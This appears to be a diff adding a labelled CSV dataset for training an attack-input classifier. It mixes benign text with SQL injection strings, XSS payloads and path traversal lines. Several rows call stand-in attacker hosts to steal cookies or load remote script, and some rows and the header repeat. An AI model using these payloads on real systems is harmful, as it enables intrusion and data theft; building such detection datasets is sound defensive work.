@@ -1,0 +1,150 @@
+payload,label
+' OR '1'='1,sql
+http://example.com/login.php?id=1' OR '1'='1,sql
+update users set name='admin' --,sql
+DROP TABLE users,sql
+SELECT password FROM users WHERE username='admin',sql
+"' UNION SELECT null,null,null--",sql
+1=1; DROP TABLE students;,sql
+SELECT * FROM users WHERE name = '',sql
+admin'--,sql
+<script>alert(1)</script>,xss
+<img src=x onerror=alert(1)>,xss
+<script>window.location='http://evil.com'</script>,malicious
+<svg onload=alert('xss')>,xss
+<iframe src='http://malicious.com'></iframe>,malicious
+<script>alert(document.cookie)</script>,xss
+<script>fetch('http://attacker.com')</script>,malicious
+<meta http-equiv='refresh' content='0;url=http://evil.com'>,malicious
+../../../../etc/passwd,malicious
+<script>document.location='http://mal.com'</script>,malicious
+<script src='http://evil.com/xss.js'></script>,malicious
+Hello World,benign
+Just an innocent message,benign
+https://example.com/reset-password?token=12345,benign
+https://shop.com/product?id=12,benign
+Nice weather today,benign
+Hi there! How can I help you?,benign
+Click here to reset your password,benign
+Hello from the support team.,benign
+Welcome to the dashboard,benign
+Great work on the project!,benign
+https://example.com/home,benign
+https://news.site/article?id=55,benign
+https://myblog.com/contact,benign
+https://events.org/2024/conference,benign
+Simple query string value,benign
+https://example.com/home,benign
+https://news.site/article?id=55,benign
+https://myblog.com/contact,benign
+https://events.org/2024/conference,benign
+Simple query string value,benign
+https://example.com/home,benign
+https://news.site/article?id=55,benign
+https://myblog.com/contact,benign
+https://events.org/2024/conference,benign
+Simple query string value,benign
+https://example.com/home,benign
+https://news.site/article?id=55,benign
+https://myblog.com/contact,benign
+https://events.org/2024/conference,benign
+Simple query string value,benign
+payload,label
+' OR '1'='1,sql
+<script>alert(1)</script>,xss
+http://example.com/login.php?id=1' OR '1'='1,sql
+<img src=x onerror=alert(1)>,xss
+This is normal input,benign
+update users set name='admin' --,sql
+Hello World,benign
+DROP TABLE users,sql
+<script>document.location='http://mal.com'</script>,malicious
+admin'--,sql
+Robert'); DROP TABLE Students;--,sql
+<iframe src='http://malicious.com'></iframe>,malicious
+http://example.com/index.php?name=<script>alert(123)</script>,xss
+' UNION SELECT null,null,null--,sql
+<script>fetch('http://attacker.com')</script>,malicious
+http://example.com/home.php?q=' OR 'x'='x,sql
+SELECT * FROM users WHERE name = '',sql
+"><script>confirm('xss')</script>,xss
+<script>window.location='http://evil.com'</script>,malicious
+1; DROP DATABASE shop;,sql
+<script>new Image().src='http://attacker.com/?cookie='+document.cookie</script>,malicious
+' OR 1=1 --,sql
+<script>var x = new XMLHttpRequest();</script>,xss
+admin' OR 1=1--,sql
+SELECT password FROM users WHERE username='admin',sql
+Nice weather today,benign
+Click here to reset your password,benign
+<body onload=alert('xss')>,xss
+javascript:alert('xss'),xss
+<svg onload=alert('xss')>,xss
+'; EXEC xp_cmdshell('dir'); --,sql
+0; --,sql
+Just an innocent message,benign
+alert('Injected'),xss
+<object data='http://evil.com/file.swf'>,malicious
+http://badguy.com/phish?user=admin,malicious
+alert(document.domain),xss
+<meta http-equiv='refresh' content='0;url=http://evil.com'>,malicious
+../../../../etc/passwd,malicious
+<script>eval(atob('YWxlcnQoMSk='))</script>,malicious
+DROP DATABASE example_db;,sql
+INSERT INTO users VALUES ('admin','hack');,sql
+<script>alert(document.cookie)</script>,xss
+<input onfocus=alert('xss')>,xss
+https://example.com/reset-password?token=12345,benign
+Hi there! How can I help you?,benign
+SELECT credit_card FROM customers WHERE user='admin',sql
+<script>alert('pwned')</script>,xss
+http://phishingsite.com/login,malicious
+Hello world from user input!,benign
+<script>while(true){}</script>,malicious
+user_input=hello123,benign
+../../../../boot.ini,malicious
+<script>setInterval(function(){ alert('XSS'); }, 1000);</script>,xss
+http://example.com/?q=<svg onload=alert(5)>,xss
+1=1; DROP TABLE students;,sql
+Nice to meet you!,benign
+admin' AND 1=1--,sql
+<script src="http://evil.com/exploit.js"></script>,malicious
+Hi! I'm just a chatbot.,benign
+<script>window.open('http://malicious.com')</script>,malicious
+<select name='user'><option>Admin</option></select>,benign
+<script>alert(/xss/)</script>,xss
+SELECT * FROM products WHERE id='1',sql
+<link rel="stylesheet" href="http://evil.com/mal.css">,malicious
+Hello, how are you?,benign
+<video><source onerror="alert('XSS')"></video>,xss
+admin' OR 1=1 LIMIT 1--,sql
+<script>navigator.sendBeacon('http://attacker.com')</script>,malicious
+Welcome to the dashboard,benign
+<script>this.ownerDocument.location='http://steal.com'</script>,malicious
+<button onclick="alert('xss')">Click me</button>,xss
+SELECT * FROM login WHERE user='',sql
+<script>top.location='http://stealer.com'</script>,malicious
+Greetings!,benign
+<script>alert(String.fromCharCode(88,83,83))</script>,xss
+DROP TABLE IF EXISTS users;,sql
+<base href="http://evil.com/">,malicious
+Hi Team, thanks for your message.,benign
+';shutdown --,sql
+<form action="http://steal.com">,malicious
+<script>alert(navigator.userAgent)</script>,xss
+I love this app!,benign
+admin'||'1'='1',sql
+"><img src=x onerror=alert('hacked')>,xss
+<script src="//evil.com/xss.js"></script>,malicious
+Hi there! Welcome back.,benign
+<script>$.getScript('http://evil.com/js')</script>,malicious
+Hello from the support team.,benign
+<script>document.body.innerHTML='Hacked!'</script>,malicious
+AND 1=1--,sql
+Nice job!,benign
+<script>new Function('alert("XSS")')();</script>,xss
+user=1' OR '1'='1,sql
+Hello user123,benign
+<script>document.write('<iframe src="http://evil.com"></iframe>')</script>,malicious
+Great work on the project!,benign
+<script>location.replace('http://phish.com')</script>,malicious
